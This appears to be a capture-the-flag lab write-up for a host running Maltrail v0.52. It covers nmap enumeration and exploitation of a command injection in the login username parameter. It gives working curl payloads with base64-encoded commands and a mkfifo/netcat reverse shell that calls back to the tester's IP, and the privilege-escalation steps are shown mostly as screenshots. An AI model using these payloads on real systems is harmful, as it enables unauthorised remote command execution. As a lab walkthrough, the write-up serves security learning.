#Pwned! 
```IP
192.168.140.32
```
## Enumeration
## Nmap
As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 192.168.140.32 -vvv -p- -oN enum/full
```
The output being:
```
PORT     STATE SERVICE REASON         VERSION        
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)       
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBYESg2KmNLhFh1KJaN2UFCVAEv6MWr58pqp2fIpCSBEK2wDJ5ap2XVBVGLk9Po4eKBbqTo96yttfVUvXWXoN3M=          
|   256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)         
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBdIs4PWZ8yY2OQ6Jlk84Ihd5+15Nb3l0qvpf1ls3wfa
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.52 ((Ubuntu))      
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.52 (Ubuntu)
8338/tcp open  unknown syn-ack ttl 61
```
## HTTP 80
apache 2.4.52
## HTTP 8338
maltrail v 0.52
# Exploitation

we search for mailtrail vulnerabilities, and we find command injection in the username parameter 

```
echo 'ping -c 5 192.168.45.176' | base64
```
```
curl 'http://192.168.140.32:8338/login' --data 'username=;`echo+\"cGluZyAtYyA1IDE5Mi4xNjguNDUuMTc2Cg==\"+|+base64+-d+|+sh`'
```
we can successfully ping ourselves
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241204103745.png?raw=true)
After some trial and error, I got a revshell the following mkfifo payload set on local port 80:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc  192.168.45.176 80 >/tmp/f
```

```
curl 'http://192.168.140.32:8338/login' --data 'username=;`echo+\"cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAgMTkyLjE2OC40NS4xNzYgODAgPi90bXAvZg==\"+|+base64+-d+|+sh`'
```

# PrivEsc

## Manual
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241204110845.png?raw=true)

we find the following file

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241204114500.png?raw=true)
with pspy64 we can see that it is running as root
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241204114717.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241204115148.png?raw=true)

we receive the revshell
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241204115217.png?raw=true)


## Automated

### Peass
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241204114628.png?raw=true)
### Mimikatz

# Lateral Movement

